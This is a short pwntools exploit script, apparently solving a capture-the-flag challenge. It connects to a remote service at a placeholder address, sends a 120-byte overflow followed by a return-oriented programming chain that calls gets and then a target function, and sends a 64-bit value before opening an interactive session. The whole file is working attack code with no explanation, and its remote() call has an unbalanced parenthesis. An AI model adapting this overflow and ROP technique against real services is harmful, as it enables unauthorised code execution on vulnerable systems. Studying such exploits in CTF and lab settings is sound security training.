# ignore /lib/x86_64-linux-gnu/libc-2.31.so
from pwn import *

r = remote("x.x.x.x"), 9999)

main = 0x4012f8+4
bfnc = 0x4011d6+4
gets = 0x4010d0
jumps = 0x40408c
pop_rdi = 0x4013d3

ret = 0x4013d4
f_234 = 0x3f9df3b6

payload = b'a' * 120
payload += p64(pop_rdi)
payload += p64(jumps)
payload += p64(gets)
payload += p64(bfnc)

r.recvuntil(b'hurt!')
r.sendline(payload)
print('payload')
r.recvuntil(b"wasn't it!")
print('f64')
r.sendline(p64(f_234))
r.interactive()
